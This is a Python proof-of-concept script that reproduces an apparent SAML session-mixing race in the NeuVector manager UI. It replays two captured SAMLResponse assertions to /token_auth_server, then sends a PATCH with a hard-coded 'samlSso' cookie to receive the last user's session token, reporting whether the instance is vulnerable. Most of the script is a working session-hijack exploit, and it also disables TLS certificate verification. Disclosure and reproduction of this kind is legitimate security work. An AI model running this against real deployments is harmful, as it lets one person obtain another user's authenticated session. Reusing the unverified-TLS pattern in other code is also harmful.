#!/usr/bin/env python3
"""
CVE-2026-78428 - NeuVector proof of concept.
Reproduce neuvector-manager SAML session mixing (AuthenticationManager "samlSso" race).

Simulates two IdP callbacks (POST /token_auth_server) before the login page picks up
the token (PATCH /token_auth_server). The last POST wins; the PATCH returns that user.

Requires:
  - Fresh, unused SAMLResponse values for two users (capture from browser or using Burp; ~5 min TTL)
  - Manager UI reachable (not controller API directly for this test)
  - Manager replica count = 1 recommended (in-memory map is per pod)

Usage:
  cp env.example saml-swap-test.env  # set NV_UI + SAML_REDIRECT
  python3 scripts/saml-manager-race-test.py \\
    --first /tmp/nv-saml-responses/alice.response \\
    --second /tmp/nv-saml-responses/bob.response \\
    --expect-last-user bob
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import ssl
import sys
from datetime import datetime, timezone
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_ENV_FILE = SCRIPT_DIR / "saml-swap-test.env"

# SamlAuthApi: Base64.encode("samlSso") - same cookie for every login this is the issue
TEMP_COOKIE = "temp=c2FtbFNzbw=="

EXIT_VULNERABLE = 2
EXIT_PROTECTED = 0


def load_env(path: Path) -> dict[str, str]:
    env: dict[str, str] = {}
    if not path.is_file():
        return env
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, value = line.partition("=")
        env[key.strip()] = value.strip().strip('"').strip("'")
    return env


def config() -> dict[str, str]:
    env_file = Path(os.environ.get("SAML_SWAP_ENV", DEFAULT_ENV_FILE))
    file_env = load_env(env_file)
    ui = os.environ.get("NV_UI", file_env.get("NV_UI", ""))
    redirect = os.environ.get("SAML_REDIRECT", file_env.get("SAML_REDIRECT", ""))
    if not ui and redirect:
        # derive UI base from redirect_endpoint
        ui = redirect.rsplit("/token_auth_server", 1)[0]
    return {
        "NV_UI": ui.rstrip("/"),
        "SAML_REDIRECT": redirect,
    }


def ssl_context() -> ssl.SSLContext:
    return ssl._create_unverified_context()


def http_opener_no_redirect() -> urllib.request.OpenerDirector:
    """Do not follow 302/301 - manager SAML callback returns redirect on success."""

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            raise urllib.error.HTTPError(
                req.full_url, code, msg, headers, fp
            )

    return urllib.request.build_opener(
        NoRedirect,
        urllib.request.HTTPSHandler(context=ssl_context()),
    )


def post_success(status: int) -> bool:
    # 302 = controller OK, token stored; 301 = controller rejected (expired/used SAML)
    return status in (302, 301)


def post_token_stored(status: int) -> bool:
    return status == 302


def host_header(ui_base: str) -> str:
    return urllib.parse.urlparse(ui_base).netloc


def build_form_body(raw: str) -> bytes:
    """Build IdP-style POST body for /token_auth_server."""
    raw = raw.strip().replace("\n", "").replace("\r", "")
    if raw.startswith("SAMLResponse="):
        # Full form body copied from DevTools - use as-is
        if "RelayState" not in raw:
            raw = f"{raw}&RelayState="
        return raw.encode("utf-8")
    # Value only: DevTools often gives URL-encoded SAML - decode once before re-encoding
    if "%" in raw:
        raw = urllib.parse.unquote(raw)
    return urllib.parse.urlencode({"SAMLResponse": raw, "RelayState": ""}).encode("utf-8")


def validate_saml_value(raw: str, label: str = "") -> None:
    """Best-effort check that the file looks like SAML base64, not double-encoded garbage."""
    sample = raw.strip()
    if sample.startswith("SAMLResponse="):
        sample = urllib.parse.parse_qs(sample).get("SAMLResponse", [""])[0]
    if "%" in sample:
        sample = urllib.parse.unquote(sample)
    try:
        decoded = base64.b64decode(sample, validate=False)
    except Exception as e:
        print(f"WARNING{(' ' + label) if label else ''}: not valid base64: {e}", file=sys.stderr)
        return
    if not decoded.startswith(b"<?xml") and b"saml" not in decoded[:200].lower():
        print(f"WARNING{(' ' + label) if label else ''}: decoded payload is not SAML XML", file=sys.stderr)
        return
    xml = decoded.decode("utf-8", errors="replace")
    m = re.search(r'NotOnOrAfter="([^"]+)"', xml)
    if m:
        expiry = datetime.fromisoformat(m.group(1).replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        prefix = f"{label}: " if label else ""
        if expiry <= now:
            print(f"WARNING: {prefix}assertion EXPIRED at {m.group(1)} (will likely fail POST)", file=sys.stderr)
        else:
            secs = int((expiry - now).total_seconds())
            print(f"  {prefix}assertion valid for ~{secs}s (until {m.group(1)})")


def read_response_file(path: Path) -> str:
    return path.read_text()


def post_saml_callback(ui_base: str, host: str, response_raw: str) -> tuple[int, str, dict]:
    url = f"{ui_base}/token_auth_server"
    body = build_form_body(response_raw)
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": host,
            "Accept": "*/*",
        },
    )
    opener = http_opener_no_redirect()
    headers: dict[str, str] = {}
    try:
        with opener.open(req) as resp:
            headers = dict(resp.headers.items())
            return resp.status, resp.read().decode("utf-8", errors="replace"), headers
    except urllib.error.HTTPError as e:
        headers = dict(e.headers.items()) if e.headers else {}
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body, headers


def patch_pickup_token(ui_base: str, host: str) -> tuple[int, str]:
    url = f"{ui_base}/token_auth_server"
    req = urllib.request.Request(
        url,
        data=b"",
        method="PATCH",
        headers={
            "Host": host,
            "Cookie": TEMP_COOKIE,
            "Accept": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(req, context=ssl_context()) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")


def identity_from_patch(payload: dict) -> str:
    token = payload.get("token") or {}
    parts = [token.get("username"), token.get("fullname"), token.get("email")]
    return " | ".join(p for p in parts if p)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Reproduce manager SAML race (global samlSso token slot)"
    )
    parser.add_argument("--first", required=True, type=Path, help="First user's SAMLResponse file")
    parser.add_argument("--second", required=True, type=Path, help="Second user's SAMLResponse file (overwrites first)")
    parser.add_argument(
        "--expect-last-user",
        help="Substring expected in PATCH identity (should match --second user if vulnerable)",
    )
    parser.add_argument("--no-patch", action="store_true", help="Only POST both; skip PATCH pickup step")
    parser.add_argument("--debug", action="store_true", help="Print POST response bodies and headers")
    args = parser.parse_args()

    cfg = config()
    if not cfg["NV_UI"]:
        print("ERROR: set NV_UI or SAML_REDIRECT in saml-swap-test.env", file=sys.stderr)
        sys.exit(1)

    host = host_header(cfg["NV_UI"])
    first_raw = read_response_file(args.first)
    second_raw = read_response_file(args.second)
    validate_saml_value(first_raw, "alice/first")
    validate_saml_value(second_raw, "bob/second")

    print("== Manager SAML race reproduction ==")
    print(f"UI:      {cfg['NV_UI']}")
    print(f"Host:    {host}")
    print(f"Cookie:  {TEMP_COOKIE}")
    print()
    print("Step 1: POST first user SAMLResponse (simulates Alice IdP callback)")
    s1, b1, h1 = post_saml_callback(cfg["NV_UI"], host, first_raw)
    print(f"  HTTP {s1} (expect 302 Found = token stored; 301 = rejected SAML)")
    if args.debug or not post_token_stored(s1):
        print(f"  body: {b1[:300]!r}")
        if h1.get("Location"):
            print(f"  Location: {h1.get('Location')}")
    print("Step 2: POST second user SAMLResponse (simulates Bob IdP callback - overwrites samlSso slot)")
    s2, b2, h2 = post_saml_callback(cfg["NV_UI"], host, second_raw)
    print(f"  HTTP {s2}")
    if args.debug or not post_token_stored(s2):
        print(f"  body: {b2[:300]!r}")
        if h2.get("Location"):
            print(f"  Location: {h2.get('Location')}")

    if not post_token_stored(s2):
        print("\nRESULT: second POST did not store a token (need HTTP 302). Re-capture fresh SAML responses.")
        if s1 == 500:
            print("  First POST returned 500 - often expired/already-used assertion or manager error.")
        sys.exit(1)

    if not post_token_stored(s1):
        print("\nNOTE: first POST did not store a token; second POST alone still tests PATCH pickup.")

    if args.no_patch:
        print("\nSkipped PATCH. In browser, user who POST'd first would now pick up second user's token.")
        sys.exit(0)

    print("Step 3: PATCH token_auth_server (simulates first user's login page after redirect)")
    s3, body3 = patch_pickup_token(cfg["NV_UI"], host)
    print(f"  HTTP {s3}")
    print()

    try:
        payload = json.loads(body3)
    except json.JSONDecodeError:
        print("Response (non-JSON):", body3[:500])
        print("\nRESULT: could not parse PATCH response")
        sys.exit(1)

    if s3 != 200:
        print(json.dumps(payload, indent=2) if isinstance(payload, dict) else body3)
        print("\nRESULT: PROTECTED or error (no token handed out)")
        sys.exit(EXIT_PROTECTED)

    identity = identity_from_patch(payload)
    print(f"PATCH returned identity: {identity or '<unknown>'}")

    if args.expect_last_user:
        if args.expect_last_user.lower() in identity.lower():
            print("\nRESULT: VULNERABLE - first login flow received last user's session (manager race confirmed)")
            sys.exit(EXIT_VULNERABLE)
        print(f"\nRESULT: INCONCLUSIVE - expected '{args.expect_last_user}' in identity")
        sys.exit(3)

    print("\nRESULT: PATCH succeeded - re-run with --expect-last-user to assert wrong-user handoff")
    sys.exit(EXIT_VULNERABLE)


if __name__ == "__main__":
    main()
